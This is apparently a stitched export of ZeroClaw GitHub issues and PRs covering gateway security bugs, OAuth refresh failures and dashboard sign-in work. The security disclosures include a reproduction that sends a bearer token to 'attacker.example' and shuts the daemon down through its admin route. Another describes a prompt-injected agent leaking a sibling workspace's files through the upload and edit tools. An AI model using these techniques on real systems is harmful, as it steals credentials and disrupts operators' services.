Follow-up from the review of #12114, which fixes #12052 for the limiter keys.

`crates/zeroclaw-gateway/src/api_sop_author.rs` `authorize_sop_cancel` calls `forwarded_client_ip` directly when `gateway.require_pairing` is off and `gateway.trust_forwarded_headers` is on. If the result is loopback, it grants `ApprovalPrincipal::cli` and lets the request cancel a SOP run. Otherwise it refuses with "Remote SOP cancellation requires gateway pairing ... or call from localhost."

#12114 changes `forwarded_client_ip` to prefer the rightmost non-loopback `X-Forwarded-For` hop, which already closes the appending-proxy case (on master, a client-supplied leading `127.0.0.1` passed as local). But when the forwarded value is loopback-only, `forwarded_client_ip` still returns `127.0.0.1`, and this check still treats it as local. In the same PR, `client_key_from_request` treats exactly that value as spoofed and never gives it the loopback exemption.

It's reachable when the client's `X-Forwarded-For` reaches the gateway unchanged with trust on: an `X-Real-IP`-only proxy that doesn't clear the list (the setup the #12114 docs warn against), or `trust_forwarded_headers` enabled with no proxy at all. It requires pairing to be off, so the exposure is narrow, but this route is one of the few with an extra locality guard in that posture.

### Acceptance criteria

- With `trust_forwarded_headers` on, a request whose forwarded address is loopback-only, or whose `X-Forwarded-For` contains only loopback hops, is not treated as local by `authorize_sop_cancel`.
- A direct loopback request with no forwarded header still cancels without pairing, as today.
- `authorize_sop_cancel` and `client_key_from_request` share one helper for the "is this request local" decision, so they can't drift apart again.
- Tests cover: a forwarded `127.0.0.1` with a loopback peer (refused), a forwarded `127.0.0.1` with a remote peer (refused), and a direct loopback peer with no forwarded header (allowed).

### Likely files or areas

- `crates/zeroclaw-gateway/src/api_sop_author.rs`: `authorize_sop_cancel`.
- `crates/zeroclaw-gateway/src/lib.rs`: `forwarded_client_ip`, `client_key_from_request`.

### Contributor fit

good first issue candidate

### Mentor, reviewer, or contact

@tidux

### Risk notes

Security-relevant but narrow: it only matters with gateway pairing disabled. Land after #12114, which changes `forwarded_client_ip`.

issues.body:
### Affected component

tools

### Severity

S2 - degraded behavior

### Current behavior

An SSE-transport MCP server tells the client where to post messages through an `endpoint` event. `parse_endpoint_from_data` (`crates/zeroclaw-tools/src/mcp_transport.rs:1768-1779`) accepts the data as a bare string or as JSON with an `endpoint` key; a relative value is joined onto the SSE URL, and a value that starts with `http://` or `https://` is returned exactly as given. Two tests pin that behaviour (`parse_endpoint_absolute_http_url_returned_as_is` and the https twin, `mcp_transport.rs:3351-3357`). The result becomes the connection's `message_url` (`1721-1726`), and every JSON-RPC request to it carries the configured headers (`1241-1255`, `1400`), which the schema documents as secret because they commonly hold bearer tokens (`crates/zeroclaw-config/src/schema.rs:5878-5879`).

So the server, or anyone who can write into a plaintext `http://` stream between the daemon and the server, chooses where the daemon sends its credentialed requests. A compromised server collects the token on a third origin it controls, which matters when the same token is accepted by other services behind the same provider, and it can also point the daemon at hosts the attacker cannot reach: an internal service, or the daemon's own gateway. `POST http://127.0.0.1:42617/admin/shutdown` ignores the request body and trusts the loopback peer (#12141), so a single `endpoint` event stops the daemon from across the internet. The legacy `/sse` convention is handled by `derive_message_url` (`1684-1700`), which rebuilds the path on the original URL and never leaves the origin; the general case does not get that treatment.

### Expected behavior

The client accepts an endpoint only on the same origin as the SSE URL, meaning the same scheme, host and port, and never a downgrade from https to http; a relative endpoint is joined and then checked the same way. A cross-origin endpoint is refused with a logged error that names both origins, and the configured headers are attached only to requests whose destination passed that check. The two tests that assert absolute URLs are returned as is become tests that assert they are refused unless same-origin.

### Steps to reproduce

```bash
# Run a tiny SSE server that answers GET /sse with:
#   event: endpoint
#   data: http://127.0.0.1:42617/admin/shutdown
# Configure it: [mcp.servers.evil] transport = "sse" url = "http://<server>/sse"
# headers = { Authorization = "Bearer test-token" }
# Start the daemon: its first JSON-RPC POST goes to the loopback admin route and the daemon shuts down.
# Variant: data: https://attacker.example/collect  -> the request arrives there with the Authorization header.
```

### Impact

The actor is the remote MCP server the operator configured, or a network attacker on a plaintext SSE connection; no model involvement is needed. The likelihood is moderate: remote SSE servers are the normal way to use hosted MCP services, and operators cannot audit a provider's behaviour over time. What is exposed is the bearer token in the configured headers, sent to a destination of the server's choosing, together with a server-side request forgery primitive into the daemon's network position, which, through the loopback-trusted admin routes, becomes a remote stop button.

**Attack path**

```mermaid
sequenceDiagram
    autonumber
    participant D as Daemon (MCP SSE client)
    participant S as Remote SSE server
    participant T as Third origin or 127.0.0.1:42617
    D->>S: GET /sse with Authorization header
    S-->>D: event: endpoint, data: https://attacker.example/collect (absolute, kept as is)
    D->>D: message_url = that URL
    D->>T: POST JSON-RPC with Authorization: Bearer <token>
    Note over T: token collected, or /admin/shutdown trusts the loopback peer
```

**Evidence:** static review of master `1c1cd118ac`; not executed.

issues.body:
### Affected component tools ### Severity S2 - degraded behavior ### Current behavior The multi-agent permission model keeps three allowlists apart. A sibling workspace named under `[agents..workspace.access]` with `Read` lands in the read-only list, with `Write` in the write-only list, and with `ReadWrite` in both (`docs/book/src/agents/internals.md:16-20`). The policy honours the distinction: `is_resolved_path_readable` deliberately leaves the write-only roots out, with the comment that `AccessMode::Write` is one-way by design (`crates/zeroclaw-config/src/policy.rs:4330-4336`), while `is_resolved_path_allowed`, the write check, includes them (`policy.rs:4304-4370`). The `Write` grant is the inbox pattern: one agent may deposit results into another agent's workspace without being able to look at what is already there. Three tools that read files ask the write question. `file_upload` runs the lexical check, canonicalizes the path and then calls `is_resolved_path_allowed` (`crates/zeroclaw-tools/src/file_upload.rs:213`, `242`), after which it reads the whole file (`file_upload.rs:284`) and hands the bytes to the channel for delivery. `file_upload_bundle` does the same per entry (`file_upload_bundle.rs:343`). `file_edit` checks the resolved parent with the write tier (`file_edit.rs:161`), reads the file, counts occurrences of `old_string` (`file_edit.rs:219`) and reports the result: `old_string not found in file`, `matches N times; must match exactly once` (`229-234`), or a diagnostic that compares a whitespace-normalized form and says whether the difference is only indentation (`270-281`). That is an oracle. An agent that may only write into a sibling's workspace can ask, one guess at a time, whether any string occurs in any file there, and with the upload tools it does not need to guess: it ships the file to a chat channel it controls. ### Expected behavior Reading tools should ask the reading question. `file_upload` and `file_upload_bundle` authorize with `is_resolved_path_readable`, and `file_edit` requires the target to pass both the readable and the writable checks, since an edit reads before it writes; for a path that is writable but not readable, `file_edit` refuses before opening the file rather than after counting matches. Each tool gets a test with a write-only root: upload refused, edit refused with a message that reveals nothing about the content, `file_write` still allowed. ### Steps to reproduce ```bash # config.toml: two agents, "a" may only write into "b" [agents.a.workspace.access] b = "Write" # as agent a, with the path of b's workspace: # file_read path="/notes.txt" -> refused (read-only list excludes write-only roots) # file_upload file_path="/notes.txt" ... -> delivered to the channel # file_edit path="/notes.txt" old_string="password" new_string="password" # -> "old_string not found in file" or "matches 3 times": the content leaks ``` ### Impact The vector is an agent that already holds a `Write` grant on a sibling, which is a deliberate operator decision in multi-agent setups, and the only extra ingredient is a prompt injection or a misbehaving model that calls the upload or edit tool instead of `file_read`. The likelihood is moderate wherever that grant is used; the inbox pattern exists precisely so that agents with different trust levels can hand work to each other, and this turns the hand-off channel into a read channel. What is exposed is every file in the sibling workspace, delivered through whatever channel the uploading agent can reach, or confirmed string by string through the edit diagnostics. **Data flow** ```mermaid flowchart LR G["[agents.a.workspace.access] b = Write"] --> W["b's workspace in a's write-only list"] W --> R{"which check does the tool ask?"} R -->|"is_resolved_path_readable (file_read, content_search)"| D["refused: write-only roots excluded"] R -->|"is_resolved_path_allowed (file_upload, file_upload_bundle, file_edit)"| A["allowed"] A --> U["upload: file bytes sent to a channel"] A --> O["edit: match count and whitespace diagnostics
answer any substring query"] classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef good fill:#e2f5e2,stroke:#008000,color:#000 class A,U,O bad class D good ``` **Evidence:** static review of master `1c1cd118ac`; not executed. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system any ### Regression? issues.body:
The gateway's API documentation page pulls its viewer script from a public content delivery network, always the newest version, with nothing that checks the file is the one expected. That page lives on the same web origin as the dashboard, so a script that has been tampered with runs with the same access as the dashboard itself. On today's dashboard it could read the pairing token saved in the browser, and with the coming cookie-based sign-in it could act as the signed-in user.

### Affected component

gateway/api

### Severity

S0 - data loss / security risk

### Current behavior

`crates/zeroclaw-gateway/src/openapi_docs.html:54` loads `https://cdn.jsdelivr.net/npm/@scalar/api-reference` with no version and no `integrity` attribute, so the newest published bundle runs on every visit. `crates/zeroclaw-gateway/src/openapi.rs:16-24` sets a page CSP that allows scripts, styles, images and fonts from that host plus `'unsafe-inline'`, and `handle_docs` (lines 31-42) reads no credentials, so `GET /api/docs` (`crates/zeroclaw-gateway/src/lib.rs:2596`) is public. The page shares the dashboard's origin, where the pairing token is kept in `localStorage` (`web/src/lib/auth.ts:8-19`).

### Expected behavior

Third-party script on the gateway origin should be pinned to an exact version and carry a Subresource Integrity hash, or be vendored and served by the gateway itself. The docs page CSP should not need `'unsafe-inline'` for scripts, and a failed integrity check should fall back to the existing offline note. A page that only renders documentation should not be able to reach the dashboard's stored credentials.

### Steps to reproduce

```text
1. Pair a browser with the dashboard, so a pairing token sits in localStorage for the gateway origin.
2. In the same browser open /api/docs; the page fetches the latest @scalar/api-reference bundle from
   cdn.jsdelivr.net with no version pin and no integrity attribute.
3. Any script delivered under that URL runs same-origin and can read localStorage and call the API
   with the token; the CSP admits it because the host is allowed.
Source-traced at master 5d4b18d335; not executed.
```

### Impact

A compromised CDN response, a hijacked package release, or a network attacker on a plain-HTTP deployment can run script on the dashboard origin whenever an operator opens the docs page. On master that script can read the operator's pairing token from `localStorage` and use it against every paired route. With PR #11965 it can read the CSRF token from `GET /api/auth/session` and ride the cookie session, so the exposure grows with dashboard sign-in; related #11961.

### Logs / stack traces

_No response_

### ZeroClaw version

master 5d4b18d335 (v0.8.7)

### Rust version

n/a (source review); CI pins 1.98.0

### Operating system

Any; reviewed in source on macOS

### Regression?

No, first-time setup

### Pre-flight checks

- [ ] I reproduced this on the latest master branch or latest release.
Source-traced at master 5d4b18d335; no runtime reproduction was run.
- [X] I redacted secrets, tokens, and personal data from all submitted content.

### Recommended action

Pin `@scalar/api-reference` to an exact version with an `integrity` hash and `crossorigin="anonymous"`, or build it into `web/` as the page's own offline note already suggests, and keep the offline fallback for a failed load. Drop `'unsafe-inline'` from the docs page `script-src` if the pinned bundle runs without it. Consider serving the explorer from a path or origin that carries no dashboard credentials.

issues.body:
### Affected component

provider

### Current behavior

OpenAI OAuth refresh tokens are **single-use and rotate**: each successful refresh returns a new refresh token and invalidates the old one. ZeroClaw stores a snapshot of that token in its auth profile, but the Codex CLI (`~/.codex/auth.json`) refreshes the *same* OAuth identity independently. Whichever client refreshes first silently invalidates the other's stored copy.

Once that happens, `zeroclaw auth refresh` cannot recover — it dead-ends on a raw provider 401:

```text
$ zeroclaw auth refresh --model-provider openai-codex
Error: OpenAI OAuth token request failed (401 Unauthorized): {
  "error": {
    "message": "Your refresh token has already been used to generate a new access token. Please try signing in again.",
    "type": "invalid_request_error",
```

`refresh_access_token` (`crates/zeroclaw-providers/src/auth/openai_oauth.rs:114-129`) performs a bare `refresh_token` grant and propagates whatever the endpoint returns. There is no detection of the rotated-token case and no fallback.

The practical result is that a ZeroClaw profile sharing an identity with the Codex CLI degrades on a timer: it works until the CLI refreshes, then every request fails and `auth refresh` — the obvious repair — cannot fix it.

### Expected behavior

When refresh fails because the refresh token was consumed elsewhere, ZeroClaw should tell the operator what will actually work rather than surfacing a raw 401.

Concretely, any of:

- Detect this specific failure and print the recovery: `zeroclaw auth login --model-provider openai-codex --import ~/.codex/auth.json`.
- Let `auth refresh` fall back to re-reading the source `auth.json` when one is known for the provider, since the external client is the authority on the current token.
- Document that a profile imported from `~/.codex/auth.json` is a point-in-time snapshot that goes stale whenever the Codex CLI refreshes, so operators expect to re-import rather than refresh.

The recovery command already exists (`--import`); nothing surfaces it at the point of failure.

### Steps to reproduce

```bash
# 1. Import Codex CLI credentials into ZeroClaw
zeroclaw auth login --model-provider openai-codex --import ~/.codex/auth.json
zeroclaw auth status     # healthy

# 2. Let the Codex CLI refresh the shared identity (happens on normal use).
#    ~/.codex/auth.json last_refresh advances; the old refresh token is now spent.
codex exec --skip-git-repo-check "hello"

# 3. ZeroClaw's stored copy is now stale. Refresh dead-ends:
zeroclaw auth refresh --model-provider openai-codex
# Error: ... 401 ... "Your refresh token has already been used to generate a new access token."

# Only re-import recovers it:
zeroclaw auth login --model-provider openai-codex --import ~/.codex/auth.json
```

### Impact

Affected users: anyone running ZeroClaw against an OpenAI-Codex subscription that is also used by the Codex CLI on the same machine — which is the normal way to obtain those credentials, since `--import` reads exactly that file.

Frequency: every time the external client refreshes. Observed twice in one day here; the imported access token was valid for ~12h on the first import.

Consequence: the provider stops working and the documented repair (`auth refresh`) cannot fix it. The operator must know to re-import, which the error does not mention. Worked around locally with a 6-hourly timer that re-imports from `~/.codex/auth.json`.

### Logs / stack traces

```text
$ zeroclaw auth status
* openai-codex:default kind=OAuth account=<redacted> expires=expired at 2026-07-28T14:35:19+00:00

$ zeroclaw auth refresh --model-provider openai-codex
Error: OpenAI OAuth token request failed (401 Unauthorized): {
  "error": {
    "message": "Your refresh token has already been used to generate a new access token. Please try signing in again.",
    "type": "invalid_request_error",

$ zeroclaw auth login --model-provider openai-codex --import ~/.codex/auth.json
Imported auth profile from ~/.codex/auth.json
Active profile for openai-codex: default

$ zeroclaw auth status
* openai-codex:default kind=OAuth account=<redacted> expires=expires in 14295m (2026-08-07T14:30:29+00:00)
```

### ZeroClaw version

0.8.2 (runtime repro). Not re-tested on 0.8.3 at runtime: reproducing it again requires deliberately consuming the shared refresh token, which would break the Codex CLI session in active use on this host. Verified by source inspection that the path is unchanged on `origin/master` — `refresh_access_token` at `crates/zeroclaw-providers/src/auth/openai_oauth.rs:114-129` issues the grant and propagates the response with no rotated-token handling.

### Rust version

rustc 1.96.1 (31fca3adb 2026-06-26)

### Operating system

Ubuntu 24.04.4 LTS (WSL2, kernel 6.18.33.2-microsoft-standard-WSL2)

### Regression?

Unknown

### Pre-flight checks

- [X] I reproduced this on the latest master branch or latest release.
- [X] I redacted secrets, tokens, and personal data from all submitted content.

issues.title: [Task]: keep the SOP approval verbs and the exit-code health check off the gateway address in builds without the gateway

labels.name: status:in-progress
labels.description: Open PR actively targets this issue; recheck when PR closes.

issues.body:
### Task

In a build without the `gateway` feature (the CLI-only build, #11971), stop `zeroclaw sop pending|logs|approve|deny` and `zeroclaw status --format exit-code` from sending HTTP requests to the configured `gateway.host`/`gateway.port`.

### Context

#11975 makes `zeroclaw gateway …` and `zeroclaw desktop` print one line pointing to the standard build, and exit non-zero, before any request in a build without the gateway. [Its review](https://github.com/zeroclaw-labs/zeroclaw/pull/11975#pullrequestreview-5645246804) found two more callers in the same family:

- **SOP approval verbs.** `zeroclaw sop pending`, `logs`, `approve` and `deny` go through `sop_admin_dispatch` → `sop_admin_request` in `src/main.rs`.
  - They send requests to `/admin/sop/{pending,logs,approve,deny}` at `gateway_admin_url(gateway.host, gateway.port, gateway.path_prefix, …)`.
  - Only the gateway serves those routes (`crates/zeroclaw-gateway/src/api_sop.rs`). The daemon's local RPC socket has no SOP approval method.
  - So in a CLI-only build nothing in this instance can answer. The commands fail with "Failed to connect to gateway". Or, if another ZeroClaw instance holds that port, `pending` and `logs` read its runs and `approve` and `deny` POST to it. That is the cross-instance risk #11975 closed for `gateway restart`.
- **The exit-code health check.** `zeroclaw status --format exit-code` is the Docker `HEALTHCHECK` in `Dockerfile`, `Dockerfile.alpine` and `Dockerfile.debian`.
  - It probes `http://{gateway.host}:{gateway.port}/health` and exits 0 only on success.
  - In a CLI-only build it is therefore always unhealthy, or falsely healthy when another instance holds the port.
  - The daemon does run in a CLI-only build, and its local RPC socket (`zeroclaw_runtime::rpc::local::socket_path`) answers a `health` method (`handle_health` in `rpc/dispatch.rs`).

#12091 is a different problem on the same SOP callers: the admin URL ignores `[gateway.tls]`.

Related #11971, #11975, #11976, #12091.

### Acceptance criteria

- **SOP verbs.** In a build without the gateway, `sop pending`, `logs`, `approve` and `deny` make no network request. They print the same one-line standard-build message as `zeroclaw gateway …` and exit non-zero. Making SOP approval itself work in a CLI-only build would need a new RPC method, and is out of scope here.
- **Health check.** In a build without the gateway, `status --format exit-code` does not contact the gateway address. It checks the daemon over its local RPC socket instead: exit 0 when the daemon answers `health` and reports itself healthy, and exit 1 otherwise. What counts as healthy is decided and written in the command's help text.
- **Standard builds are unchanged**, for both commands.
- **Tests, in the CLI-only set** (`tests/component/cli_only_build.rs`, which #11976's lane runs):
  - each SOP verb exits non-zero with the message, and a listener on the configured gateway port sees no connection;
  - `status --format exit-code` exits 1 with no daemon running, without connecting to a listener on the gateway port.

### Likely files or areas

- `src/main.rs`: the `Commands::Sop` dispatch, `sop_admin_dispatch`, `sop_admin_request`, `Commands::Status` (`--format exit-code`) and `no_dashboard_in_build_message`
- `crates/zeroclaw-runtime/src/rpc/local.rs` (`socket_path`, `call_local`) and `rpc/dispatch.rs` (`handle_health`)
- `tests/component/cli_only_build.rs`

### Contributor fit

maintainer-scoped task, not yet ready for pickup labels

It builds on #11975 and #11976, which haven't merged yet.

### Mentor, reviewer, or contact

@JordanTheJet (author of #11971 and #11975)

### Risk notes

Low. Both changes apply only in builds without the gateway, and standard builds must not change. Reviewers should check two things:
- no CLI-only path still reaches the configured gateway port;
- the health check does not report healthy when the daemon is down.

At PR #10295 head `f6921923b5ede2a07c35b6afb5ca22458b637538`, `default_tool_disclosure` parses complete specialized file input JSON to classify the card. The open `file_edit` and `file_write` render paths parse it again before applying the 8 KiB/100-line display limit. 3. Follow the specialized open-card rendering branch and observe the second `serde_json::from_str` before display projection.
4. In the repair, add focused multiline and greater-than-8-KiB single-line cases that establish bounded/reused parsing work and preserve full raw copy.

issues.title: [Task]: tell other dashboard tabs about a full-page sign-in

labels.name: gateway
labels.description: Auto scope: src/gateway/** changed.

labels.name: status:in-progress
labels.description: Open PR actively targets this issue; recheck when PR closes.

issues.body:
### Task

When a dashboard tab completes a normal (full-page) OIDC sign-in, tell the browser's other dashboard tabs, as the re-auth window already does. A tab showing the sign-in screen then picks up the new session.

### Context

Follow-up from the review of #11965 (dashboard sign-in).

Dashboard tabs share the session cookie and coordinate over the `BroadcastChannel` named by `AUTH_CHANNEL`. A tab on the sign-in screen that hears `signed-in` re-reads the session and adopts it. A tab still holding another account's page reloads.

Only the re-auth window posts `signed-in`. The sign-in callback's popup page does it (`signed_in_popup_page` in `crates/zeroclaw-gateway/src/api_oidc.rs`). A full-page sign-in redirects back to the dashboard instead, and the dashboard adopts the session on load without posting anything.

So after a normal sign-in in one tab, another tab showing the sign-in screen stays there until it's reloaded, although the session is already usable there.

### Acceptance criteria

- After a full-page sign-in in one tab, other dashboard tabs on the sign-in screen pick up the session without a reload, and a tab holding another account's page reloads, as after a popup sign-in.
- Opening or reloading a dashboard that was already signed in doesn't make every other tab re-read the session.
- A test covers the full-page case.

### Likely files or areas

- `web/src/hooks/useAuth.ts` (the initial `signed-in` case, the channel)
- `web/src/lib/authSession.ts` (`signInUrl`, channel messages)
- `crates/zeroclaw-gateway/src/api_oidc.rs` (the callback's redirect), only if the gateway marks a fresh sign-in. Alternatively, the tab that starts the sign-in can note it, for example in `sessionStorage`, and post once it has adopted the session.

### Contributor fit

maintainer-scoped task, not yet ready for pickup labels

### Mentor, reviewer, or contact

@JordanTheJet

### Risk notes

Low. The message carries no secret: each tab re-reads the session through its own cookie.

prs.title: fix(web): announce completed full-page sign-ins to other tabs
prs.body:
## Summary

- **Base branch** `master`
- **What changed and why** A dashboard tab starting full-page sign-in records a random notice ID in its own session storage. The gateway appends that ID to the validated return location after a successful callback. The returning tab consumes its matching notice, cleans up the URL, and announces `signed-in` after it adopts the cookie session.
  - Retain a matching callback notice if the first session check fails transiently. Consume it only after successful adoption or when a subsequent session change supersedes it.
- **Scope boundary** This covers full-page sign-in and the full-page option after a blocked re-auth popup. A dashboard with unavailable tab storage falls back to its existing sign-in navigation.
- **Blast radius** Dashboard OIDC sign-in initiation, successful callback redirects that request a notice, and the recipient tabs' existing session check.
- **Linked issue(s)** Closes #12108. Related #11965 and #12106. [PR #12533](https://github.com/zeroclaw-labs/zeroclaw/pull/12533) separately guards adoption when sign-out supersedes a probe.

### What this does, simply

If two tabs show the sign-in screen and you sign in through one, the other can enter the dashboard too. It checks its own session cookie before showing account data. An ordinary reload or a bookmark from an earlier sign-in stays quiet.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes. A configured dashboard identity provider and two tabs exercise the real browser and provider together.
- **Interface(s) exercised** Web dashboard.
- **Setup / preconditions** Open the same dashboard in two tabs on its sign-in screen.
- **Steps to run** Complete a full-page sign-in in the first tab. Watch the second tab. Then reload the first tab and watch requests to `/api/auth/session` in the second tab.
- **Expected on this branch (after)** The second tab reads its session and enters the dashboard. Reloading the first tab produces no additional session read in the second tab. A tab still showing another account reloads before adopting the new account.
- **Prior behavior on `master` (before)** The second tab stays on its sign-in screen until reloaded.

### How I tested

- **CI checks relied on** The Linux gateway suite can run the mock-IdP test `full_page_sign_in_returns_the_notice_to_the_dashboard`. It exercises a real auth start and callback, checks for the session cookie and checks the returned path, query, anchor and notice together.
- **Known CI coverage gap** External identity-provider deployments and browser privacy settings remain untested. The local WireMock fixture could not bind its loopback port. The actual `full_page_sign_in_returns_the_notice_to_the_dashboard` callback test passed on the signed PR head in the hosted Linux Test job. [Linux Test](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/44242420412/job/134593238557)
- **Commands run and tail output**
  - `npm run test:auth` in `web/` on Node 24 passed 223 tests across 17 test files at the original head. After a review follow-up, 226 passed on `c84240dfe1`.
  - `npm run typecheck`, `cargo fmt --all -- --check` and `git diff --check` passed.
  - `cargo test --locked --offline -p zeroclaw-gateway --lib dashboard_sign_in_appends_only_the_requested_uuid_to_the_safe_landing` reported `1 passed; 0 failed`.
  - The docs quality gate reported zero issues. The links gate passed six collector tests and found no added links.
- **Beyond CI** Disabling the sender's `post` made the full-page regression fail with an empty event list. Restoring it returned the suite to green. The hook tests cover an abandoned attempt, a lookalike fragment, an ordinary reload, an old bookmark, and preserving an existing query and anchor.
- **Visual interface evidence** The hook tests mount the dashboard sign-in screen, use its auth provider and observe the actual browser-compatible broadcast channel. The two-browser check above remains available for final interactive verification.
- **Tested revision, interface, and evidence path** The initial callback test ran on signed feature head `88350adf86`. Updated head `c84240dfe1` passed all 226 web auth tests and TypeScript; it retains the same gateway change. See `web/src/hooks/useAuth.test.ts` and `crates/zeroclaw-gateway/src/dashboard_session.rs`.
- **Screenshot or exact-output evidence** The newly emitted message was exactly `{ type: "signed-in" }` once. The cleaned return URL was `/agent/main?sort=new#turn`. After reload, the event list still contained one message.
- **Action or changed state and observed result** The returning tab became authenticated and emitted the notice. The existing receiving-hook checks cover adopting the same account and reloading for another account.
- **If any command was intentionally skipped, why** The local verification focused on dashboard auth, gateway landing behavior, type checking and documentation. CI covers the wider workspace.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No.
- New external network calls? No. Other dashboard tabs use their existing same-origin session probe.
- Secrets / tokens / credentials handling changed? No. The notice is a random correlation value. Possessing it grants no access. Broadcasts contain the event type alone, and each recipient verifies its own cookie.
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No.
- Prompt injection or untrusted model-visible text introduced/changed? No.

## Compatibility (required)

- Backward compatible? Yes. Existing login URLs and direct clients can omit the optional `notice` parameter. The callback still uses an HTTP 303. The validated return-path size and same-dashboard checks apply before the gateway attaches a parsed UUID.
- Config / env / CLI surface changed? No.
- Rust/MSRV/toolchain floor changed? No.
- Upgrade steps for existing users? None.

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path** Revert the merged commit on a review branch. Dashboard tabs will pick up full-page sign-ins when they refresh.
- **Feature flags or config toggles** None.
- **Observable failure symptoms** A signed-out tab remains on its sign-in screen after another tab signs in, or a routine reload wakes other tabs.

## Supersede Attribution (required only when `Supersedes #` is used)

N/A. This implements the follow-up to #11965.

prs.title: fix(runtime): resolve configured Agent routes through the provider source
prs.body:
## Summary

- **Base branch** `master`
- **What changed and why** When a configured hint matches, a capability-built `Agent` asks its bound provider source for the selected provider reference and physical model. It passes the same agent identity and principal. For effort routing it filters the request's config with the helper already used by the CLI.
- **Scope boundary** This applies to matched routes in `Agent::turn` and the streamed turn path, including RPC sessions that use them. The configured adapter router continues to receive its existing hint selector. Unclassified turns retain the session provider.
- **Blast radius** Provider dispatch, vision/tool-dispatch selection, response-cache identity and model switches on routed turns. A turn-local route releases its handle after an explicit model switch, including when two provider profiles have the same model name.
- **Linked issue(s)** Closes #12092. Related #10993, #11174, #11516 and #11187. Draft pending hosted HTTP/routing checks and review of the provider authority change.

### What this does, simply

An application can supply its own model providers. Previously the agent could select another configured provider but still send the request to the session default, using a routing hint as the model name. Both turn entry points now call the selected provider with its real model name.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The integration fixture constructs a real agent, installs an in-process provider source, and calls both public turn entry points without external provider credentials.

### How I tested

- **CI checks relied on** The runtime suite covers compatibility adapters, model switching and response caching. Two existing model-switch tests use a local HTTP server and need a CI runner that permits binding loopback.
- **Known CI coverage gap** No external provider or running daemon was used. On the local host `turn_streamed_model_switch_refreshes_capped_native_request` and `try_apply_model_switch_uses_target_alias_endpoint_and_credentials` stopped at their fake server's loopback bind with `PermissionDenied`.
- **Commands run and tail output**
  - `cargo test --locked --offline -p zeroclaw-runtime --lib supplied_effort_route_selects_the_provider_and_model_for_both_turn_paths` reported `1 passed; 0 failed`.
  - Eleven focused runtime tests passed on the submitted tree, covering actual turn dispatch, the supplied principal and restricted config, the response cache, model switching, compatibility adapters and the effort attempt allowlist.
  - `cargo +1.98.0 clippy --locked --offline -p zeroclaw-runtime --lib --tests -- -D warnings --no-deps`, `cargo +1.98.0 fmt --all -- --check` and `git diff --check` passed.
  - The docs quality gate reported zero issues. The links gate passed six collector tests and found no added links.
- **Beyond CI** Ran the new test against the original implementation. The first `Agent::turn` returned `default served hint:local` where the fixture expected `openai.smart served local-model`. The fixed ordinary and streamed turns each made one route lookup and produced the expected provider label and model.

- **Tested revision, interface, and evidence path** The signed head `6ed7eb8fb5` and tested commit `8f07081b0a` share tree `9405a98b3b` on `115a03b517`. See `supplied_effort_route_selects_the_provider_and_model_for_both_turn_paths` and `response_cache_separates_configured_provider_identity` in `crates/zeroclaw-runtime/src/agent/agent.rs`.

Both turns left the session default available. An explicit same-model-name switch installed the target source handle, and the cache key reflected the provider that actually served the request.
- **If any command was intentionally skipped, why** The focused runs cover the changed routing and cache boundaries. CI covers the wider workspace and loopback-dependent provider tests.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No. The existing bound source remains authoritative and receives the original principal. A source refusal ends selection. Effort routes reuse the established provider allowlist and scoped config.
